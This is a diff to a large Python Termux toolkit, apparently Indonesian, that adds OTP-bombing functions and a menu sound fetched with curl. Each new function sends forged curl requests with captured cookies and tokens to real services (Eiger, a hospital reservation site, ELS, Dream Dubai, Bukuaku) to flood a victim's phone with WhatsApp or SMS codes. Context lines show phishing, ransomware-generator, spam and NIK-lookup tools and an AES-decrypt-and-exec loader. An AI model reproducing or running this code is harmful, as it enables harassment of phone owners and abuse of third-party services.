@@ -62,6 +62,20 @@ BP = '\033[47m'
 
 os.system('clear')
 
+def play_menu_sound():
+    try:
+        sound_dir = "/sdcard/Sounds"
+        if not os.path.exists(sound_dir):
+            os.makedirs(sound_dir)
+
+        sound_file = os.path.join(sound_dir, "Masuk_menu.mp3")
+        if not os.path.exists(sound_file):
+            os.system('curl -s -L "https://raw.githubusercontent.com/OoTotapxciwiiekfkdoapz1910la9911729Kh1/Sound-Mikasa/main/Masuk_menu.mp3" -o "/sdcard/Sounds/Masuk_menu.mp3"')
+
+        os.system('mpv --no-video --really-quiet "/sdcard/Sounds/Masuk_menu.mp3" 2>/dev/null &')
+    except:
+        pass
+
 def loading_running(text="Sedang Running Tools", duration=10):
     chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
     start = time.time()
@@ -3893,34 +3907,6 @@ def spam_otp_toss2(nomor):
     except Exception as e:
         return False
 
-def spam_otp_eiger(nomor):
-    try:
-        if nomor.startswith('0'):
-            nomor_lokal = '+62' + nomor[1:]
-        elif nomor.startswith('62'):
-            nomor_lokal = '+' + nomor
-        elif nomor.startswith('+62'):
-            nomor_lokal = nomor
-        else:
-            nomor_lokal = '+62' + nomor
-
-        url = 'https://careloyalty.eigerindo.co.id/api/v1/otp/send'
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'content-type': 'application/json',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
-        }
-        payload = {
-            'mobile_phone': nomor_lokal,
-            'via': 'whatsapp'
-        }
-        
-        r = requests.post(url, json=payload, headers=headers, timeout=10)
-        return r.status_code < 400
-        
-    except Exception as e:
-        return False
-
 def spam_otp_farmaklik(nomor):
     try:
         if nomor.startswith('62'):
@@ -5811,6 +5797,117 @@ def spam_otp_bunda_cms(nomor):
         
     except Exception as e:
         return False
+        
+def spam_otp_eiger(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = '+62' + nomor[1:]
+        elif nomor.startswith('62'):
+            phone = '+62' + nomor
+        elif nomor.startswith('+62'):
+            phone = nomor
+        else:
+            phone = '+62' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('62'):
+            phone = '62' + phone
+        
+        phone = '+' + phone
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://careloyalty.eigerindo.co.id/api/v1/otp/send' \\
+  -H 'host: careloyalty.eigerindo.co.id' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/plain, */*' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'content-type: application/json' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'origin: https://club.eigeradventure.com' \\
+  -H 'sec-fetch-site: cross-site' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://club.eigeradventure.com/' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -d '{{"mobile_phone":"{phone}","via":"whatsapp"}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+        
+def spam_otp_pkumayong(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor
+        elif nomor.startswith('62'):
+            phone = '0' + nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = '0' + nomor[3:]
+        else:
+            phone = '0' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('0'):
+            phone = '0' + phone
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://reservasi.pkumayong.com/reqOTP' \\
+  -H 'host: reservasi.pkumayong.com' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'x-requested-with: XMLHttpRequest' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: */*' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'origin: https://reservasi.pkumayong.com' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://reservasi.pkumayong.com/login' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: XSRF-TOKEN=eyJpdiI6IlFydHpESGdLMTRCSFR2cmczOUE1b2c9PSIsInZhbHVlIjoiaks0WkgzMEtHVWlMZWY5ZXFlUHVkTmJ2cURNQmw5V0JkeThPcm9MY01jVzZXSUZzc1RQU2RQdnZMOW43NHc1YVBpeldxNVN6V2h6cUpReUZyQkNoeWc9PSIsIm1hYyI6IjM0YzY0NDI3NjE2MjZhMjBmYWQ4ODMzMDRjYTVmYzRlYThiMmEyNTljNjNmNzNjOTNkNmVhYzRkMDM0OGUzNmYifQ%3D%3D; laravel_session=eyJpdiI6ImFPYTl6djJpUGhYWjAxSGJpQThnWlE9PSIsInZhbHVlIjoiaExkQU02Q2diRnczM2RESzNxOTN3enBNYUdhOTRwYWNkSGpoK3ZpNm1QOUxJY3hBZ20yKzJMXC9yc0FReGRQUnlXSXBkS3dLSUxiMFNHelFNSmhpQ3FnPT0iLCJtYWMiOiJmY2IyYzYyYzAyZWE1NjlhYmUxZjlmMGJmNmQ4MTQ3MTMzNTBjMzA4Njc3MzYyYzQ1OTQxNzU5OTc3OTlhMjVhIn0%3D' \\
+  -H 'priority: u=1, i' \\
+  --data-raw '_token=VNbW1nBJZCtIWp0264iC0O2ao5qVpGRCpX9UW1NW&nohp={phone}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
 
 def loading_spinner():
     chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
@@ -5822,6 +5919,221 @@ def loading_spinner():
         time.sleep(0.1)
     sys.stdout.write("\r" + " " * 40 + "\r")
     sys.stdout.flush()
+
+def spam_otp_babyhappy(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor[1:]
+        elif nomor.startswith('62'):
+            phone = nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = nomor[3:]
+        else:
+            phone = nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://club.babyhappydiapers.com/api/registration/resend-otp-phone' \\
+  -H 'host: club.babyhappydiapers.com' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/plain, */*' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'content-type: application/json' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'origin: https://club.babyhappydiapers.com' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://club.babyhappydiapers.com/registration' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: _gcl_au=1.1.1607778853.1787457141; _ga=GA1.1.345266246.1787457141; _tt_enable_cookie=1; _ttp=01M0PBZ2G221DTCR2TCZP9NR5J_.tt.1; _fbp=fb.1.1787457144780.679918106559872972.AQYAAQIB; ttcsid_D6J6BNRC77UCPJEO2GU0=1787457145405::yZHNrp369Xay2lZSg8Ah.1.1787457156785.1; cphone={phone}; _gcl_gs=2.1.k1$i1787457792$u37029106; _gcl_aw=GCL.1787457796.CjwKCAjwkaXUBhASEiwAZI3ds8_i9ubY7AiAmkjJ6S2JxDvkIP3eWg1n09EdLYlRyHm_otGZPRiQOxoCOH0QAvD_BwE; ttcsid=1787457145411::Ue7LBTLOfkm-jeYclKyU.1.1787457846118.0::1.670669.651725::700582.25.326.828::685893.16.125; ttcsid_D7SQ6T3C77U4TTGIHFM0=1787457145433::EJ3SqZp4PDfpKlkAnNZT.1.1787457846120.1; _ga_KKVZ5M822G=GS2.1.s1787457141$o1$g1$t1787457846$j9$l0$h0' \\
+  -H 'priority: u=1, i' \\
+  -d '{{"phone":"{phone}"}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
+def spam_otp_els(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = '62' + nomor[1:]
+        elif nomor.startswith('+62'):
+            phone = nomor[1:]
+        elif nomor.startswith('62'):
+            phone = nomor
+        else:
+            phone = '62' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        import subprocess
+        import json
+        import random
+        import string
+        
+        name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
+        
+        curl_cmd = f"""curl -s -X POST 'https://member.els.id/api/publics/membership/auth/otp/register/send' \\
+  -H 'host: member.els.id' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'content-type: application/json' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'origin: https://member.els.id' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://member.els.id/' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: _gcl_au=1.1.838671011.1787470004; _ga=GA1.1.682741423.1787470005; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F151.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fels.id%2F; cf_clearance=u6Yw53DFZSn56DwrIlr_ZxIJ9QfqwnH2LibY8_8COnI-1787470010-1.2.1.1-_Yzp10QlUiRV7_dM.hIBu_eQ3j3H1PjSGu1muhrB4u_RL0xoU8qhCyhl.N3cRybkTtmjWUhDR67gbn9HDIdr00a2BrABvmCMw8UEUo0e0aU2M3I9tnuq6rNMdEyNQm4Xba4pBLulS543BCbF.BGwHOhtvHDuLDN5acRtj9dibyAytzGMrvioCMqvNZxo7yxNb2YWZSjJdkyGp9kAwNCxYNl5_1JQFV7BxjNGKWwjsYxwxR.V1NU6M6X60TAIR5e9PLg2EvtnobHKN0BN2L__rm21D8d32j1hU0zbYeg5dAYipblrEk6X1JwYTUMSoO1bxZ8nJOFpq.HJ.1.QBfBb9nzY7jioh7dIdfxkoJ9I73s; _ga_E3DHK5EHFD=GS2.1.s1787470004$o1$g1$t1787470057$j7$l0$h0; ESODA_ELS_MEMBERSHIP=4612f1cd046264b1e30adf495e046db0; _ga_JT6HY1CYT1=GS2.1.s1787470070$o1$g0$t1787470071$j59$l0$h0' \\
+  -d '{{"name":"{name}","mobilephone":"{phone}"}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
+def spam_otp_dreamdubai(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor[1:]
+        elif nomor.startswith('62'):
+            phone = nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = nomor[3:]
+        else:
+            phone = nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://www.dreamdubai.com/send-sms-web' \\
+  -H 'host: www.dreamdubai.com' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'x-requested-with: XMLHttpRequest' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/javascript, */*; q=0.01' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'origin: https://www.dreamdubai.com' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://www.dreamdubai.com/login' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: cquid=||; __cq_dnt=0; dw_dnt=0; dwac_7bec52bd774fafa7db63dd4057=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY%3D|dw-only|||AED|false|Asia%2FDubai|true; cqcid=abvjR9yv05ESdLZnHR91lRWUF1; sid=W4-0OarJWqvCtL9Z7KY1EK9krjnjhcv-1hY; dwanonymous_4331083bd03400c189943d61e1cec6f3=abvjR9yv05ESdLZnHR91lRWUF1; dwsid=twdRkKTkmCImlUsRMH9LBkPsS5DtqAl3MjcZ87C95egkhfzbVC7cgsGVHXVBcgEW7HRjl0WmItTbDoKBKWbsAQ==; _gcl_au=1.1.1946167819.1787471764; _ga=GA1.1.1950809663.1787471765; _scid=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _scid_r=1NHPZChyXKzc0jProZl2Ysvmi_xSTkDN; _tt_enable_cookie=1; _ttp=01M0PSX8SNJVMS4Z4RMC04KFE5_.tt.1; _fbp=fb.1.1787471766583.518002055353343985; __cq_uuid=abvjR9yv05ESdLZnHR91lRWUF1; __cq_seg=0~0.00!1~0.00!2~0.00!3~0.00!4~0.00!5~0.00!6~0.00!7~0.00!8~0.00!9~0.00; adjust_web_uuid=01084d62-d6eb-46f0-1e7a-2ea4a6d74006; moe_uuid=f12354a2-ff50-4ca4-a11c-894991f0c79e; _ga_5SBWDJD7BR=GS2.1.s1787471764$o1$g1$t1787471783$j41$l0$h0; ttcsid=1787471766394::iLRSmXWkEDcPZtKcpYlf.1.1787471796796.0::1.-6089.0::30175.5.347.429::0.0.0; ttcsid_CMSC9GJC77U67KV9FM3G=1787471766387::4t-aqwqsjjEKeGJ_Bmt5.1.1787471796797.1' \\
+  -H 'priority: u=1, i' \\
+  --data-raw 'phoneNumber={phone}&countryCode=%2B62&isApp=false&mode=whatsapp-otp'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
+
+def spam_otp_bukuaku(nomor):
+    try:
+        if nomor.startswith('0'):
+            phone = nomor
+        elif nomor.startswith('62'):
+            phone = '0' + nomor[2:]
+        elif nomor.startswith('+62'):
+            phone = '0' + nomor[3:]
+        else:
+            phone = '0' + nomor
+        
+        phone = ''.join(filter(str.isdigit, phone))
+        
+        if not phone.startswith('0'):
+            phone = '0' + phone
+        
+        import subprocess
+        import json
+        
+        curl_cmd = f"""curl -s -X POST 'https://bukuaku.id/base/forgot_password' \\
+  -H 'host: bukuaku.id' \\
+  -H 'sec-ch-ua-platform: "Android"' \\
+  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
+  -H 'accept: application/json, text/plain, */*' \\
+  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
+  -H 'content-type: application/json' \\
+  -H 'sec-ch-ua-mobile: ?1' \\
+  -H 'origin: https://bukuaku.id' \\
+  -H 'sec-fetch-site: same-origin' \\
+  -H 'sec-fetch-mode: cors' \\
+  -H 'sec-fetch-dest: empty' \\
+  -H 'referer: https://bukuaku.id/id/login/forgot-password' \\
+  -H 'accept-encoding: gzip, deflate, br, zstd' \\
+  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
+  -H 'cookie: auth.strategy=local; cf_clearance=XqnbImZU1JDSaShhb_lmYSpQqKmmCO9LXzhupeLjb4Q-1787472072-1.2.1.1-QHXLCp4nn93kWxK329lkkBmufK61MrozGvisAi5I63FFG9hOuxAma36dmo1zR_6WDUUGtMKeWjunD.ZVtfBH2naodVEMlOIAbS1gr7UfK5rIGFZOOeoReHAxz_6JUcOZibiR1Eyi64cokdS0l0d2qSoclc86B8J.BNNgGDAE_nGxci1_vsnCw5sfFeWtB5khVDMOks7FA7CEJ_pVcX9gyk53ovGK.8Z7uUlgYm9iS_zebMc4pprAjKdDrueY5Zy12Pky.BIJQJFYqtdechKNkk4bXrch1XONusumwCGokSdr7cmalMeSZXeLgMOq4Ddv8jl5G.ybxcHwECWUY3kr_303wQpLvS7TE9p0PT.Xej0; _gcl_au=1.1.984154179.1787472072; _ga=GA1.1.250152120.1787472073; _ga_9KQFL3Q499=GS2.1.s1787472072$o1$g1$t1787472585$j60$l0$h0; _ga_GN7DGX69XZ=GS2.1.s1787472073$o1$g1$t1787472586$j59$l0$h0' \\
+  -H 'priority: u=1, i' \\
+  -d '{{"otp_type":"WA","phone":"{phone}"}}'"""
+        
+        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
+        
+        if result.returncode == 0 and result.stdout:
+            try:
+                data = json.loads(result.stdout)
+                if data.get('success') or data.get('status') == 'success':
+                    return True
+                if data.get('message') and 'otp' in str(data.get('message')).lower():
+                    return True
+                return False
+            except:
+                return True
+        return False
+        
+    except Exception as e:
+        return False
 
 def mulai_spam(nomor):
      global cooldown_otp, stop_cooldown, stop_spinner
@@ -5939,6 +6251,11 @@ def mulai_spam(nomor):
      "106": spam_otp_kpoin,
      "107": spam_otp_99co,
      "108": spam_otp_bunda_cms,
+     "109": spam_otp_pkumayong,
+     "110": spam_otp_babyhappy,
+     "111": spam_otp_els,
+     "112": spam_otp_dreamdubai,
+     "113": spam_otp_bukuaku,
 }
      hasil = {}
      total_api = len(apis)
@@ -5999,6 +6316,7 @@ def mulai_spam(nomor):
      mulai_spam(nomor)
 
 def tool_otp_spam():
+    play_menu_sound()
     pantau_aktivitas()
     global cooldown_otp, stop_cooldown
     os.system('clear')
@@ -6105,6 +6423,7 @@ def tool_otp_spam():
     mulai_spam(nomor)
     
 def tool_pairing_spam():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading
     
@@ -6231,6 +6550,7 @@ def tool_pairing_spam():
         return
 
 def tool_osint():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading, re, socket
     from datetime import datetime
@@ -6626,6 +6946,7 @@ def tool_osint():
             input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_spam_report():
+    play_menu_sound()
     pantau_aktivitas()
     a = '\x1b[1;30m'
     m = '\x1b[1;31m'
@@ -7110,6 +7431,7 @@ def tool_musik():
             print(f"\n{Y}Tidak ada history untuk dihapus{N}")
 
     def show_banner():
+        play_menu_sound()
         os.system('clear')
         banner_musik = """
     ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -7287,6 +7609,7 @@ def tool_musik():
             input(f"\n{W}[ {G}✦{W} ] Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_encryptor():
+   play_menu_sound()
    import os, sys, time, random, string, base64, zlib, marshal, hashlib, hmac, struct, threading
 
    os.system('clear')
@@ -8669,6 +8992,7 @@ if __name__=='__main__':
    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_ip_tracker():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading
     
@@ -8856,6 +9180,7 @@ def tool_ip_tracker():
     input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_port_scanner():
+    play_menu_sound()
     import os, sys, time, socket, threading
     
     os.system('clear')
@@ -9030,6 +9355,7 @@ def tool_port_scanner():
     input(f"\n{Y}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_nik_checker():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading
     
@@ -9186,6 +9512,7 @@ def tool_nik_checker():
     input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_spam_NGL():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading, random, uuid
     
@@ -9397,6 +9724,7 @@ def tool_spam_NGL():
 
 def tool_Phissing():
    try:
+    play_menu_sound()
     os.system('clear')
     G = '\033[1;32m'
     W = '\033[1;37m'
@@ -9558,6 +9886,7 @@ def tool_tiktok_downloader():
     sys.stdout.flush()
 
  def banner_tiktok():
+    play_menu_sound()
     pantau_aktivitas()
     clear_screen()
     banner_Tiktok = """
@@ -9777,6 +10106,7 @@ def tool_JOIN_Grub():
     subprocess.run(["termux-open-url", link_grup])
 
 def tool_qr_generator():
+    play_menu_sound()
     os.system('clear')
     
     ascii_qr = """
@@ -9911,6 +10241,7 @@ def tool_list_user():
     print()
     input(f"{W}Tekan Enter untuk kembali...{N}")
 def tool_spam_call():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, random, string, requests, json, threading
     
@@ -10054,6 +10385,7 @@ def tool_spam_call():
         return
         
 def cek_kode_pos():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, threading, json, requests
     
@@ -10730,6 +11062,7 @@ def cek_kode_pos():
         print(f"{W}╰─────────────────────────────────────────────────────────────╯")
         input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 def tool_cek_npsn():
+    play_menu_sound()
     pantau_aktivitas()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading, subprocess
@@ -10864,6 +11197,7 @@ def tool_cek_npsn():
     input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_freefire_checker():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading
     import re
@@ -11225,6 +11559,7 @@ def tool_freefire_checker():
     input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
     
 def tool_roblox_checker():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading
     
@@ -11554,6 +11889,7 @@ def tool_roblox_checker():
     input(f"\n{W}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_gmail_spam():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading, random, smtplib
     from email.mime.text import MIMEText
@@ -11766,6 +12102,7 @@ def tool_gmail_spam():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_gtk_checker():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading, re
 
@@ -11937,6 +12274,7 @@ def tool_gtk_checker():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_telegram_spam():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading, random
     from concurrent.futures import ThreadPoolExecutor, as_completed
@@ -12129,6 +12467,7 @@ def tool_telegram_spam():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_ransomware_generator():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, random, string, base64, hashlib, subprocess
     from datetime import datetime
@@ -12288,6 +12627,7 @@ exec(compile(unpad(AES.new(_e,AES.MODE_CBC,_f).decrypt(_d),16).decode(),"<string
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_imei_checker():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading
     
@@ -12457,6 +12797,7 @@ def tool_imei_checker():
     input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_web_phising():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, requests, threading
     from urllib.parse import urlparse, quote
@@ -12648,6 +12989,7 @@ def tool_web_phising():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")
 
 def tool_web_recon():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, json, re, socket, ssl, http.client, threading, concurrent.futures
     import requests
@@ -13120,6 +13462,7 @@ def lapor_bug():
     return
 
 def tool_tambahan():
+    play_menu_sound()
     pantau_aktivitas()
     os.system('clear')
     os.system('pip uninstall -y nmap pstupil > /dev/null 2>&1 && rm -rf ~/.local/lib/python3.*/site-packages/nmap ~/.local/lib/python3.*/site-packages/pstupil > /dev/null 2>&1 && history -c > /dev/null 2>&1')
@@ -13191,6 +13534,7 @@ def tool_tambahan():
     time.sleep(1)
 
 def tool_photo_to_url():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, requests, threading
     
@@ -13315,7 +13659,7 @@ def tool_photo_to_url():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
 
 def tool_file_to_url():
-    pantau_aktivitas()
+    play_menu_sound()
     import os, sys, time, requests, threading
     
     os.system('clear')
@@ -13461,6 +13805,7 @@ def tool_file_to_url():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
 
 def tool_bunuh_bot_telegram():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, requests, json, threading
     from datetime import datetime
@@ -13632,6 +13977,7 @@ def tool_bunuh_bot_telegram():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
 
 def tool_cek_bot_telegram():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, requests, json, threading
